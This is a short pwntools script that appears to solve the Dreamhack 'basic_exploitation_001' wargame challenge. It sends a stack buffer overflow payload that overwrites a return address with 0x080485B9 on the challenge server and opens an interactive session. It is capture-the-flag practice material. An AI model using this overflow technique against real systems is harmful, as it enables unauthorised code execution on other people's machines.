from pwn import *
# r = process('./basic_exploitation_001')
r = remote("host2.dreamhack.games", 24555)
# tmp = r.recvuntil("Input:")
# print(tmp)
p = b"A" * 0x80 + b"A" * 0x4 + p32(0x080485B9)
r.sendline(p)
r.interactive()
